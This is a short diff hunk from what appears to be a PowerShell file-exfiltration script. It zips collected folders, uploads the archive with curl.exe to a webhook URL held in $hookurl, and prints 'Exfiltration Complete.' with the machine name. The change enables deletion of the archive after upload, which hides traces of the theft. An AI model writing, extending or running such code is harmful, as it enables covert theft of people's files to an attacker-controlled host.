@@ -50,7 +50,7 @@ foreach ($folder in $foldersToSearch) {
 }
 $zipArchive.Dispose()
 curl.exe -F file1=@"$zipFilePath" $hookurl
-# Remove-Item -Path $zipFilePath -Force
+Remove-Item -Path $zipFilePath -Force
 Write-Output "$env:COMPUTERNAME : Exfiltration Complete."
 }
 
